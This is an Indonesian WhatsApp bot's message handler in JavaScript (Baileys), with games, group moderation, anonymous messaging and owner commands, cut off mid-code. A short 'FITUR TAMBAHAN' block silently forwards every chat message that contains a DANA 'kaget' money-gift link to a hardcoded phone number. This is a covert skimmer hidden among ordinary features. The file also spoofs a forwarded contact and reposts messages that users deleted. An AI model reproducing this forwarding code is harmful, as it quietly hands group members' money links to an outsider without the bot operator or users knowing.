process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);

/*
 * Create By xzuy
 * Follow https://github.com/xzuyadev
 */
require("./settings");
const fs = require("fs");
const os = require("os");
const util = require("util");
const gis = require("g-i-s");
const jimp = require("jimp");
const path = require("path");
const https = require("https");
const fse = require("fs-extra");
const axios = require("axios");
const chalk = require("chalk");
const yts = require("yt-search");
const ytdl = require("ytdl-core");
const cron = require("node-cron");
const cheerio = require("cheerio");
const request = require("request");
const maker = require("mumaker");
const fetch = require("node-fetch");
const googleIt = require("google-it");
const FileType = require("file-type");
const { JSDOM } = require("jsdom");
const agent = require("superagent");
const similarity = require("similarity");
const webp = require("node-webpmux");
const ffmpeg = require("fluent-ffmpeg");
const crypto = require("crypto");
const nodemailer = require("nodemailer");
const speed = require("performance-now");
const didYouMean = require("didyoumean");
const { performance } = require("perf_hooks");
const moment = require("moment-timezone");
const translate = require("translate-google-api");
const imageToBase64 = require("image-to-base64");
const { exec, spawn, execSync } = require("child_process");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon();
const PDFDocument = require("pdfkit");
const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	getBinaryNodeChildren,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	getContentType
} = require("@whiskeysockets/baileys");

const prem = require("./src/premium");
const { LoadDataBase } = require("./src/message");
const { TelegraPh, UguuSe } = require("./lib/uploader");
const { toAudio, toPTT, toVideo } = require("./lib/converter");
const { imageToWebp, videoToWebp, writeExif } = require("./lib/exif");
const {
	chatGpt,
	tiktokDl,
	facebookDl,
	instaDl,
	instaDownload,
	instaStory,
	ytMp4,
	ytMp3,
	allDl,
	quotedLyo,
	Ytdl,
	cekKhodam,
	simi,
	mediafireDl
} = require("./lib/screaper");
const {
	rdGame,
	iGame,
	tGame,
	gameSlot,
	gameCasinoSolo,
	gameMerampok,
	gameBegal,
	daily,
	buy,
	setLimit,
	addLimit,
	addUang,
	setUang,
	transfer
} = require("./lib/game");
const {
	pinterest,
	pinterest2,
	wallpaper,
	wikimedia,
	quotesAnime,
	happymod,
	umma,
	ringtone,
	jadwalsholat,
	styletext
} = require("./lib/scraper");
const {
	unixTimestampSeconds,
	generateMessageTag,
	processTime,
	webApi,
	getRandom,
	getBuffer,
	fetchJson,
	runtime,
	clockString,
	sleep,
	isUrl,
	getTime,
	formatDate,
	tanggal,
	formatp,
	jsonformat,
	reSize,
	toHD,
	logic,
	generateProfilePicture,
	bytesToSize,
	checkBandwidth,
	getSizeMedia,
	parseMention,
	getGroupAdmins,
	readFileTxt,
	readFileJson,
	getHashedPassword,
	generateAuthToken,
	cekMenfes,
	generateToken,
	batasiTeks,
	randomText,
	isEmoji,
	getTypeUrlMedia,
	pickRandom,
	getAllHTML
} = require("./lib/function");
const download = require("./fitur/downloader");
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"));
const cekLimit = (m, db) => db.users[m.sender].limit < 1;
// Read Database
const sewa = JSON.parse(fs.readFileSync("./database/sewa.json"));
const premium = JSON.parse(fs.readFileSync("./database/premium.json"));

// Database Game
let suit = (db.game.suit = []);
let menfes = (db.game.menfes = []);
let tekateki = (db.game.tekateki = []);
let tictactoe = (db.game.tictactoe = []);
let tebaklirik = (db.game.tebaklirik = []);
let kuismath = (db.game.kuismath = []);
let tebaklagu = (db.game.tebaklagu = []);
let tebakkata = (db.game.tebakkata = []);
let family100 = (db.game.family100 = []);
let susunkata = (db.game.susunkata = []);
let tebakbom = (db.game.tebakbom = []);
let tebakkimia = (db.game.tebakkimia = []);
let caklontong = (db.game.caklontong = []);
let tebaknegara = (db.game.tebaknegara = []);
let tebakgambar = (db.game.tebakgambar = []);
let tebakbendera = (db.game.tebakbendera = []);
const fai = require("./fitur/ai");
const jeda = (milliseconds) =>
	new Promise((resolve) => setTimeout(resolve, milliseconds));
module.exports = xzuya = async (xzuya, m, chatUpdate, store) => {
	try {
		await LoadDataBase(xzuya, m);

		const botNumber = await xzuya.decodeJid(xzuya.user.id);
		const body =
			m.type === "conversation"
				? m.message.conversation
				: m.type == "imageMessage"
				? m.message.imageMessage.caption
				: m.type == "videoMessage"
				? m.message.videoMessage.caption
				: m.type == "extendedTextMessage"
				? m.message.extendedTextMessage.text
				: m.type == "buttonsResponseMessage"
				? m.message.buttonsResponseMessage.selectedButtonId
				: m.type == "listResponseMessage"
				? m.message.listResponseMessage.singleSelectReply.selectedRowId
				: m.type == "templateButtonReplyMessage"
				? m.message.templateButtonReplyMessage.selectedId
				: m.type === "messageContextInfo"
				? m.message.buttonsResponseMessage?.selectedButtonId ||
				  m.message.listResponseMessage?.singleSelectReply
						.selectedRowId ||
				  m.text
				: m.type === "editedMessage"
				? m.message.editedMessage.message.protocolMessage.editedMessage
						.extendedTextMessage
					? m.message.editedMessage.message.protocolMessage
							.editedMessage.extendedTextMessage.text
					: m.message.editedMessage.message.protocolMessage
							.editedMessage.conversation
				: "";
		const budy = typeof m.text == "string" ? m.text : "";
		const prefix = ".";
		const isCmd = body.startsWith(prefix);
		const args = body.trim().split(/ +/).slice(1);
		const isCreator = (isOwner = [botNumber, ...owner]
			.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
			.includes(m.sender));
		const quoted = m.quoted ? m.quoted : m;
		const command = isCreator
			? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
			: isCmd
			? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
			: "";
		const text = (q = args.join(" "));
		const mime = (quoted.msg || quoted).mimetype || "";
		const qmsg = quoted.msg || quoted;
		const hari = moment.tz("Asia/Jakarta").locale("id").format("dddd");
		const tanggal = moment
			.tz("Asia/Jakarta")
			.locale("id")
			.format("DD/MM/YYYY");
		const jam = moment().tz("Asia/Jakarta").locale("id").format("HH:mm:ss");
		const ucapanWaktu =
			jam < "05:00:00"
				? "Selamat Pagi 🌉"
				: jam < "11:00:00"
				? "Selamat Pagi 🌄"
				: jam < "15:00:00"
				? "Selamat Siang 🏙"
				: jam < "18:00:00"
				? "Selamat Sore 🌅"
				: jam < "19:00:00"
				? "Selamat Sore 🌃"
				: jam < "23:59:00"
				? "Selamat Malam 🌌"
				: "Selamat Malam 🌌";
		const almost = 0.72;
		const time = Date.now();
		const setv = pickRandom(listv);
		const more = String.fromCharCode(8206);
		const readmore = more.repeat(999);

		const isVip = db.users[m.sender] ? db.users[m.sender].vip : false;
		const isPremium =
			isCreator || prem.checkPremiumUser(m.sender, premium) || false;
		const isNsfw = m.isGroup ? db.groups[m.chat].nsfw : false;
		const fVerif = {
			key: {
				participant: "0@s.whatsapp.net",
				...(m.chat ? { remoteJid: `status@broadcast` } : {})
			},
			message: {
				locationMessage: {
					name: `Kazuya Bot`,
					jpegThumbnail: ""
				}
			}
		};
		// Fake
		const fkontak = {
			key: {
				remoteJid: "0@s.whatsapp.net",
				participant: "0@s.whatsapp.net",
				fromMe: false,
				id: "Kazuya"
			},
			message: {
				contactMessage: {
					displayName: m.pushName || author,
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${
						m.pushName || author
					},;;;\nFN:${m.pushName || author}\nitem1.TEL;waid=${
						m.sender.split("@")[0]
					}:${
						m.sender.split("@")[0]
					}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					sendEphemeral: true
				}
			}
		};
		const vipReply = (text) =>
			xzuya.sendMessage(
				m.chat,
				{
					text,
					contextInfo: {
						isForwarded: true,
						forwardingScore: 127,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName:
								"Gabung untuk mendapatkan informasi terbaru"
						}
					}
				},
				{ quoted: fkontak }
			);
		// Reset Limit
		cron.schedule(
			"00 00 * * *",
			() => {
				let user = Object.keys(db.users);
				for (let jid of user) {
					const limitUser = db.users[jid].vip
						? limit.vip
						: prem.checkPremiumUser(jid, premium)
						? limit.premium
						: limit.free;
					db.users[jid].limit = limitUser;
					console.log("Reseted Limit");
				}
			},
			{
				scheduled: true,
				timezone: "Asia/Jakarta"
			}
		);
		function capital(string) {
			return string.charAt(0).toUpperCase() + string.slice(1);
		}
		// Auto Set Bio
		if (db.set[botNumber].autobio) {
			let setbio = db.set[botNumber];
			if (new Date() * 1 - setbio.status > 60000) {
				await xzuya.updateProfileStatus(
					`${xzuya.user.name} | 🎯 Runtime : ${runtime(
						process.uptime()
					)}`
				);
				setbio.status = new Date() * 1;
			}
		}

		if (!db.set[botNumber].mode) {
			if (!m.key.fromMe && !isCreator) return;
		}

		// Auto Read
		if (m.message && m.key.remoteJid !== "status@broadcast") {
			console.log(
				chalk.black.bgWhite("[ Command ]:"),
				chalk.white.bold(prefix + command) +
					"\n" +
					chalk.black.bgWhite("[ Sender ]:"),
				chalk.white.bold(m.sender) +
					"\n" +
					chalk.black.bgWhite("[ Type Chat ]:"),
				chalk.white.bold(m.isGroup ? "Group Chat" : "Private Chat") +
					"\n\n"
			);
			if (db.set[botNumber].autoread) xzuya.readMessages([m.key]);
		}

		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !isCreator) {
				return;
			}

			// Anti Delete
			if (
				m.type == "protocolMessage" &&
				db.groups[m.chat].antidelete &&
				!isCreator &&
				m.isBotAdmin &&
				!m.isAdmin
			) {
				const mess = chatUpdate.messages[0].message.protocolMessage;
				if (
					store.messages &&
					store.messages[m.chat] &&
					store.messages[m.chat].array
				) {
					const chats = store.messages[m.chat].array.find(
						(a) => a.id === mess.key.id
					);
					chats.msg.contextInfo = {
						mentionedJid: [chats.key.participant],
						isForwarded: true,
						forwardingScore: 1,
						quotedMessage: { conversation: "*Anti Delete❗*" },
						...chats.key
					};
					const pesan =
						chats.type === "conversation"
							? {
									extendedTextMessage: {
										text: chats.msg,
										contextInfo: {
											mentionedJid: [
												chats.key.participant
											],
											isForwarded: true,
											forwardingScore: 1,
											quotedMessage: {
												conversation: "*Anti Delete❗*"
											},
											...chats.key
										}
									}
							  }
							: { [chats.type]: chats.msg };
					await xzuya.relayMessage(m.chat, pesan, {});
				}
			}

			// Anti Link Group
			if (
				db.groups[m.chat].antilink &&
				!isCreator &&
				m.isBotAdmin &&
				!m.isAdmin
			) {
				if (budy.match("chat.whatsapp.com/")) {
					const isGcLink = new RegExp(
						`https://chat.whatsapp.com/${await xzuya.groupInviteCode(
							m.chat
						)}`,
						"i"
					).test(m.text);
					if (isGcLink) return;
					await xzuya.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: false,
							id: m.id,
							participant: m.sender
						}
					});
					await xzuya.relayMessage(
						m.chat,
						{
							extendedTextMessage: {
								text: `Terdeteksi @${
									m.sender.split("@")[0]
								} Mengirim Link Group\nMaaf Link Harus Di Hapus..`,
								contextInfo: {
									mentionedJid: [m.key.participant],
									isForwarded: true,
									forwardingScore: 1,
									quotedMessage: {
										conversation: "*Anti Link❗*"
									},
									...m.key
								}
							}
						},
						{}
					);
				}
			}

			// Anti Virtex Group
			if (
				db.groups[m.chat].antivirtex &&
				!isCreator &&
				m.isBotAdmin &&
				!m.isAdmin
			) {
				if (budy.length > 6000) {
					await xzuya.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: false,
							id: m.id,
							participant: m.sender
						}
					});
					await xzuya.relayMessage(
						m.chat,
						{
							extendedTextMessage: {
								text: `Terdeteksi @${
									m.sender.split("@")[0]
								} Mengirim Virtex..`,
								contextInfo: {
									mentionedJid: [m.key.participant],
									isForwarded: true,
									forwardingScore: 1,
									quotedMessage: {
										conversation: "*Anti Virtex❗*"
									},
									...m.key
								}
							}
						},
						{}
					);
					await xzuya.groupParticipantsUpdate(
						m.chat,
						[m.sender],
						"remove"
					);
				}
				if (
					m.msg.nativeFlowMessage &&
					m.msg.nativeFlowMessage.messageParamsJson &&
					m.msg.nativeFlowMessage.messageParamsJson.length > 3500
				) {
					await xzuya.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: false,
							id: m.id,
							participant: m.sender
						}
					});
					await xzuya.relayMessage(
						m.chat,
						{
							extendedTextMessage: {
								text: `Terdeteksi @${
									m.sender.split("@")[0]
								} Mengirim Bug..`,
								contextInfo: {
									mentionedJid: [m.key.participant],
									isForwarded: true,
									forwardingScore: 1,
									quotedMessage: {
										conversation: "*Anti Bug❗*"
									},
									...m.key
								}
							}
						},
						{}
					);
					await xzuya.groupParticipantsUpdate(
						m.chat,
						[m.sender],
						"remove"
					);
				}
			}
		}

		// Filter Bot
		if (m.isBot) return;

		// Mengetik
		if (db.set[botNumber].autotyping && isCmd) {
			await xzuya.sendPresenceUpdate("composing", m.chat);
		}

		// Salam
		if (
			/^a(s|ss)alamu('|)alaikum(| )(wr|)( |)(wb|)$/.test(
				budy?.toLowerCase()
			)
		) {
			const jwb_salam = [
				"Wa'alaikumusalam",
				"Wa'alaikumusalam wr wb",
				"Wa'alaikumusalam Warohmatulahi Wabarokatuh"
			];
			vipReply(pickRandom(jwb_salam));
		}

		// Cek Expired
		prem.expiredCheck(xzuya, premium);

		// TicTacToe
		let room = Object.values(tictactoe).find(
			(room) =>
				room.id &&
				room.game &&
				room.state &&
				room.id.startsWith("tictactoe") &&
				[room.game.playerX, room.game.playerO].includes(m.sender) &&
				room.state == "PLAYING"
		);
		if (room) {
			let ok;
			let isWin = !1;
			let isTie = !1;
			let isSurrender = !1;
			if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text))
				return;
			isSurrender = !/^[1-9]$/.test(m.text);
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0;
			}
			if (
				!isSurrender &&
				1 >
					(ok = room.game.turn(
						m.sender === room.game.playerO,
						parseInt(m.text) - 1
					))
			) {
				m.reply(
					{
						"-3": "Game telah berakhir",
						"-2": "Invalid",
						"-1": "Posisi Invalid",
						0: "Posisi Invalid"
					}[ok]
				);
				return !0;
			}
			if (m.sender === room.game.winner) isWin = true;
			else if (room.game.board === 511) isTie = true;
			let arr = room.game.render().map((v) => {
				return {
					X: "❌",
					O: "⭕",
					1: "1️⃣",
					2: "2️⃣",
					3: "3️⃣",
					4: "4️⃣",
					5: "5️⃣",
					6: "6️⃣",
					7: "7️⃣",
					8: "8️⃣",
					9: "9️⃣"
				}[v];
			});
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX;
				isWin = true;
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner;
			if (isWin) {
				db.users[m.sender].limit += 3;
				db.users[m.sender].uang += 3000;
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join("")}\n${arr
				.slice(3, 6)
				.join("")}\n${arr.slice(6).join("")}\n\n${
				isWin
					? `@${winner.split("@")[0]} Menang!`
					: isTie
					? `Game berakhir`
					: `Giliran ${["❌", "⭕"][1 * room.game._currentTurn]} (@${
							room.game.currentTurn.split("@")[0]
					  })`
			}\n❌: @${room.game.playerX.split("@")[0]}\n⭕: @${
				room.game.playerO.split("@")[0]
			}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`;
			if (
				(room.game._currentTurn ^ isSurrender ? room.x : room.o) !==
				m.chat
			)
				room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = m.chat;
			if (room.x !== room.o)
				await xzuya.sendMessage(
					room.x,
					{ text: str, mentions: parseMention(str) },
					{ quoted: m }
				);
			await xzuya.sendMessage(
				room.o,
				{ text: str, mentions: parseMention(str) },
				{ quoted: m }
			);
			if (isTie || isWin) {
				delete tictactoe[room.id];
			}
		}

		// Suit PvP
		let roof = Object.values(suit).find(
			(roof) =>
				roof.id && roof.status && [roof.p, roof.p2].includes(m.sender)
		);
		if (roof) {
			let win = "";
			let tie = false;
			if (
				m.sender == roof.p2 &&
				/^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(
					m.text
				) &&
				m.isGroup &&
				roof.status == "wait"
			) {
				if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
					m.reply(
						`@${roof.p2.split`@`[0]} menolak suit,\nsuit dibatalkan`
					);
					delete suit[roof.id];
					return !0;
				}
				roof.status = "play";
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				m.reply(
					`Suit telah dikirimkan ke chat\n\n@${
						roof.p.split`@`[0]
					} dan @${
						roof.p2.split`@`[0]
					}\n\nSilahkan pilih suit di chat masing-masing klik https://wa.me/${
						botNumber.split`@`[0]
					}`
				);
				if (!roof.pilih)
					xzuya.sendMessage(
						roof.p,
						{
							text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
						},
						{ quoted: m }
					);
				if (!roof.pilih2)
					xzuya.sendMessage(
						roof.p2,
						{
							text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
						},
						{ quoted: m }
					);
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2)
						m.reply(
							`Kedua pemain tidak niat main,\nSuit dibatalkan`
						);
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p;
						m.reply(
							`@${
								(roof.pilih ? roof.p2 : roof.p).split`@`[0]
							} tidak memilih suit, game berakhir`
						);
					}
					delete suit[roof.id];
					return !0;
				}, roof.timeout);
			}
			let jwb = m.sender == roof.p;
			let jwb2 = m.sender == roof.p2;
			let g = /gunting/i;
			let b = /batu/i;
			let k = /kertas/i;
			let reg = /^(gunting|batu|kertas)/i;

			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				m.reply(
					`Kamu telah memilih ${m.text} ${
						!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ""
					}`
				);
				if (!roof.pilih2)
					xzuya.sendMessage(roof.p2, {
						text: "_Lawan sudah memilih_\nSekarang giliran kamu"
					});
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0];
				roof.text2 = m.text;
				m.reply(
					`Kamu telah memilih ${m.text} ${
						!roof.pilih ? `\n\nMenunggu lawan memilih` : ""
					}`
				);
				if (!roof.pilih)
					xzuya.sendMessage(roof.p, {
						text: "_Lawan sudah memilih_\nSekarang giliran kamu"
					});
			}
			let stage = roof.pilih;
			let stage2 = roof.pilih2;
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih);
				if (b.test(stage) && g.test(stage2)) win = roof.p;
				else if (b.test(stage) && k.test(stage2)) win = roof.p2;
				else if (g.test(stage) && k.test(stage2)) win = roof.p;
				else if (g.test(stage) && b.test(stage2)) win = roof.p2;
				else if (k.test(stage) && b.test(stage2)) win = roof.p;
				else if (k.test(stage) && g.test(stage2)) win = roof.p2;
				else if (stage == stage2) tie = true;
				db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3;
				db.users[roof.p == win ? roof.p : roof.p2].uang += tie
					? 0
					: 3000;
				xzuya.sendMessage(
					roof.asal,
					{
						text: `_*Hasil Suit*_${tie ? "\nSERI" : ""}\n\n@${
							roof.p.split`@`[0]
						} (${roof.text}) ${
							tie
								? ""
								: roof.p == win
								? ` Menang \n`
								: ` Kalah \n`
						}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${
							tie
								? ""
								: roof.p2 == win
								? ` Menang \n`
								: ` Kalah \n`
						}\n\nPemenang Mendapatkan\n*Hadiah :* Uang(3000) & Limit(3)`.trim(),
						mentions: [roof.p, roof.p2]
					},
					{ quoted: m }
				);
				delete suit[roof.id];
			}
		}

		// Tebak Bomb
		let pilih = "🌀",
			bomb = "💣";
		if (m.sender in tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				tebakbom[m.sender].pick++;
				xzuya.sendMessage(m.chat, {
					react: { text: "❌", key: m.key }
				});
				tebakbom[m.sender].bomb--;
				tebakbom[m.sender].nyawa.pop();
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].nyawa.length < 1) {
					await m.reply(
						`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join(
							""
						)}\n\n*Terpilih :* ${
							tebakbom[m.sender].pick
						}\n_Pengurangan Limit : 1_`
					);
					xzuya.sendMessage(m.chat, {
						react: { text: "😂", key: m.key }
					});
					delete tebakbom[m.sender];
				} else
					await m.reply(
						`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join(
							""
						)}\n\nTerpilih: ${
							tebakbom[m.sender].pick
						}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`
					);
				return !0;
			}
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				tebakbom[m.sender].pick++;
				tebakbom[m.sender].lolos--;
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].lolos < 1) {
					db.users[m.sender].uang += 6000;
					await m.reply(
						`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join(
							""
						)}\n\n*Terpilih :* ${
							tebakbom[m.sender].pick
						}\n*Sisa nyawa :* ${
							tebakbom[m.sender].nyawa
						}\n*Bomb :* ${
							tebakbom[m.sender].bomb
						}\nBonus Uang 💰 *+6000*`
					);
					delete tebakbom[m.sender];
				} else
					m.reply(
						`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${
							tebakbom[m.sender].pick
						}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${
							tebakbom[m.sender].bomb
						}`
					);
			}
		}

		// Game
		const games = {
			tebaklirik,
			tekateki,
			tebaklagu,
			tebakkata,
			kuismath,
			susunkata,
			tebakkimia,
			caklontong,
			tebaknegara,
			tebakgambar,
			tebakbendera
		};
		for (let gameName in games) {
			let game = games[gameName];
			let id = iGame(game, m.chat);
			if (!prefix) return;
			if (m.quoted && id == m.quoted.id && !isCmd) {
				if (gameName == "kuismath") {
					jawaban = game[m.chat + id].jawaban;
					const difficultyMap = {
						noob: 1,
						easy: 1.5,
						medium: 2.5,
						hard: 4,
						extreme: 5,
						impossible: 6,
						impossible2: 7
					};
					let randMoney = difficultyMap[kuismath[m.chat + id].mode];
					if (!isNaN(budy)) {
						if (budy.toLowerCase() == jawaban) {
							db.users[m.sender].uang += randMoney * 1000;
							await m.reply(
								`Jawaban Benar 🎉\nBonus Uang 💰 *+${
									randMoney * 1000
								}*`
							);
							delete kuismath[m.chat + id];
						} else m.reply("*Jawaban Salah!*");
					}
				} else {
					jawaban = game[m.chat + id].jawaban;
					let jawabBenar =
						/tekateki|tebaklirik|tebaklagu|tebakkata|tebaknegara|tebakbendera/.test(
							gameName
						)
							? similarity(budy.toLowerCase(), jawaban) >= almost
							: budy.toLowerCase() == jawaban;
					let bonus =
						gameName == "caklontong"
							? 9999
							: gameName == "tebaklirik"
							? 4299
							: gameName == "susunkata"
							? 2989
							: 3499;
					if (jawabBenar) {
						db.users[m.sender].uang += bonus * 1;
						await m.reply(
							`Jawaban Benar 🎉\nBonus Uang 💰 *+${bonus}*`
						);
						delete game[m.chat + id];
					} else m.reply("*Jawaban Salah!*");
				}
			}
		}

		// Family 100
		if (m.chat in family100) {
			if (m.quoted && m.quoted.id == family100[m.chat].id && !isCmd) {
				let room = family100[m.chat];
				let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, "");
				let isSurender = /^((me)?nyerah|surr?ender)$/i.test(teks);
				if (!isSurender) {
					let index = room.jawaban.findIndex(
						(v) =>
							v.toLowerCase().replace(/[^\w\s\-]+/, "") === teks
					);
					if (room.terjawab[index]) return !0;
					room.terjawab[index] = m.sender;
				}
				let isWin =
					room.terjawab.length ===
					room.terjawab.filter((v) => v).length;
				let caption = `Jawablah Pertanyaan Berikut :\n${
					room.soal
				}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${
					room.jawaban.find((v) => v.includes(" "))
						? `(beberapa Jawaban Terdapat Spasi)`
						: ""
				}\n${
					isWin
						? `Semua Jawaban Terjawab`
						: isSurender
						? "Menyerah!"
						: ""
				}\n${Array.from(room.jawaban, (jawaban, index) => {
					return isSurender || room.terjawab[index]
						? `(${index + 1}) ${jawaban} ${
								room.terjawab[index]
									? "@" + room.terjawab[index].split("@")[0]
									: ""
						  }`.trim()
						: false;
				})
					.filter((v) => v)
					.join("\n")}\n${isSurender ? "" : `Perfect Player`}`.trim();
				m.reply(caption);
				if (isWin || isSurender) delete family100[m.chat];
			}
		}
		// FITUR TAMBAHAN
		const thisRegex = /https:\/\/link\.dana\.id\/kaget\?/gi;
		if (budy.includes(`https://link.dana.id/kaget`)) {
			xzuya.sendMessage(`6285728153452@s.whatsapp.net`, { text: m.body });
		}

		// Menfes
		if (!m.isGroup) {
			if (menfes[m.sender] && m.key.remoteJid !== "status@broadcast") {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = {
						isForwarded: true,
						forwardingScore: 1,
						quotedMessage: {
							conversation: `*Pesan Dari ${
								menfes[m.sender].nama
									? menfes[m.sender].nama
									: "Seseorang"
							}*`
						},
						key: {
							remoteJid: "0@s.whatsapp.net",
							fromMe: false,
							participant: "0@s.whatsapp.net"
						}
					};
					const pesan =
						m.type === "conversation"
							? {
									extendedTextMessage: {
										text: m.msg,
										contextInfo: {
											isForwarded: true,
											forwardingScore: 1,
											quotedMessage: {
												conversation: `*Pesan Dari ${
													menfes[m.sender].nama
														? menfes[m.sender].nama
														: "Seseorang"
												}*`
											},
											key: {
												remoteJid: "0@s.whatsapp.net",
												fromMe: false,
												participant: "0@s.whatsapp.net"
											}
										}
									}
							  }
							: { [m.type]: m.msg };
					await xzuya.relayMessage(
						menfes[m.sender].tujuan,
						pesan,
						{}
					);
				}
			}
		}

		// Afk
		let mentionUser = [
			...new Set([
				...(m.mentionedJid || []),
				...(m.quoted ? [m.quoted.sender] : [])
			])
		];
		for (let jid of mentionUser) {
			let user = db.users[jid];
			if (!user) continue;
			let afkTime = user.afkTime;
			if (!afkTime || afkTime < 0) continue;
			let reason = user.afkReason || "";
			vipReply(
				`Jangan tag dia!\nDia sedang AFK ${
					reason ? "dengan alasan " + reason : "tanpa alasan"
				}\nSelama ${clockString(new Date() - afkTime)}`.trim()
			);
		}
		if (db.users[m.sender].afkTime > -1) {
			let user = db.users[m.sender];
			m.reply(
				`@${m.sender.split("@")[0]} berhenti AFK${
					user.afkReason ? " setelah " + user.afkReason : ""
				}\nSelama ${clockString(new Date() - user.afkTime)}`
			);
			user.afkTime = -1;
			user.afkReason = "";
		}

		switch (command) {
			// Tempat Add Case
			case "19rujxl1e":
				{
					console.log(".");
				}
				break;
			/**
			 *@param { FITUR STORE }
			 * */

			// Owner Menu
			case "mode":
				{
					await jeda(2000);
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return `example : mode public`;
					if (text == "public") {
						db.set[botNumber].mode = true;
					}
					if (text == "self") {
						db.set[botNumber].mode = false;
					}
				}
				break;
			case "setbio":
				{
					await jeda(2000);
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return vipReply("Mana text nya?");
					xzuya.setStatus(q);
					vipReply(`*Bio telah di ganti menjadi ${q}*`);
				}
				break;
			case "setppbot":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!/image/.test(mime))
						return vipReply(
							`Reply Image Dengan Caption ${prefix + command}`
						);
					let media = await xzuya.downloadAndSaveMediaMessage(
						quoted,
						"ppbot.jpeg"
					);
					if (text.length > 0) {
						let { img } = await generateProfilePicture(media);
						await xzuya.query({
							tag: "iq",
							attrs: {
								to: botNumber,
								type: "set",
								xmlns: "w:profile:picture"
							},
							content: [
								{
									tag: "picture",
									attrs: { type: "image" },
									content: img
								}
							]
						});
						await fs.unlinkSync(media);
						vipReply("Sukses");
					} else {
						await xzuya.updateProfilePicture(botNumber, {
							url: media
						});
						await fs.unlinkSync(media);
						vipReply("Sukses");
					}
				}
				break;
			case "join":
				{
					await jeda(2000);
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return vipReply("Masukkan Link Group!");
					if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
						return vipReply("Link Invalid!");
					const result = args[0].split(
						"https://chat.whatsapp.com/"
					)[1];
					vipReply(mess.wait);
					await xzuya.groupAcceptInvite(result).catch((res) => {
						if (res.data == 400)
							return m.reply("Grup Tidak Di Temukan❗");
						if (res.data == 401)
							return m.reply("Bot Di Kick Dari Grup Tersebut❗");
						if (res.data == 409)
							return m.reply("Bot Sudah Join Di Grup Tersebut❗");
						if (res.data == 410)
							return m.reply("Url Grup Telah Di Setel Ulang❗");
						if (res.data == 500) return m.reply("Grup Penuh❗");
					});
				}
				break;
			case "leave":
				{
					await jeda(2000);
					if (!isCreator) return vipReply(mess.owner);
					await xzuya
						.groupLeave(m.chat)
						.then(() =>
							xzuya.sendFromOwner(
								owner,
								"Sukses Keluar Dari Grup",
								m,
								{ contextInfo: { isForwarded: true } }
							)
						);
				}
				break;
			case "blokir":
			case "block":
				{
					await jeda(2000);
					if (!isCreator) return vipReply(mess.owner);
					if (!text && !m.quoted) {
						m.reply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = m.isGroup
							? text
								? text.replace(/\D/g, "") + "@s.whatsapp.net"
								: m.quoted?.sender
							: m.chat;
						await xzuya
							.updateBlockStatus(numbersOnly, "block")
							.then((a) => m.reply(mess.done))
